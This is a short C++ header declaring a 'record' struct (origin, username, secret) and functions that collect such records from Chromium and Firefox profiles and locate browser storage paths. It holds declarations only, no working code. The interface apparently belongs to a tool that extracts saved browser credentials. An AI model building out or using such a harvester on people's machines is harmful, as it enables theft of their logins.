#pragma once

#include <filesystem>
#include <string>
#include <vector>

namespace ariel::browser {

struct record {
    std::string browser;
    std::string profile;
    std::string type;
    std::string origin;
    std::string username;
    std::string secret;
};

std::vector<record> collect_chromium(std::vector<std::string>& warnings);
std::vector<record> collect_firefox(std::vector<std::string>& warnings);
void collect_chromium_into(std::vector<record>& out, std::vector<std::string>& warnings);
void collect_firefox_into(std::vector<record>& out, std::vector<std::string>& warnings);
std::vector<std::filesystem::path> storage_paths();

}  // namespace ariel::browser
